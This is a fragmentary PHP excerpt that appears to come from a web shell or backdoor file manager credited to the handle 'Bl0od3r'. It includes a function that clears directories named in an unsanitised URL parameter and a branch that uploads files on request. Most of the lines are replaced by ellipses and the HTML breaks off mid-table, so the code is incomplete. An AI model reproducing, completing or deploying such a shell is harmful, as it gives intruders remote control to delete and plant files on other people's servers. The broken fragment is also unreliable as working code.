...
$made_by = 'Bl0od3r';
$of = 'Netplayazz';
('Bl0od3r' == $made_by) ? $fake = 0 : $fake = 1;
('dc3' == $of) ? $fake = 0 : $fake = 1;
$st_dir = '.';
...
if (!function_exists(clear_dir)) {
    function clear_dir($dir)
    {
        ...
        while (false !== ($file = readdir($o_d))) {
            if ('file' == @filetype(urldecode($_GET['file']) . '/' . $file)) {
...
if (isset($_GET['upload'])) {
  ...
  <thead>
    <tr><td>';
        echo 'Successfully uploadet file(s)!';
    } else {
        echo '<center><table border="1" rules="groups">
  <thead>
    <tr><td>';
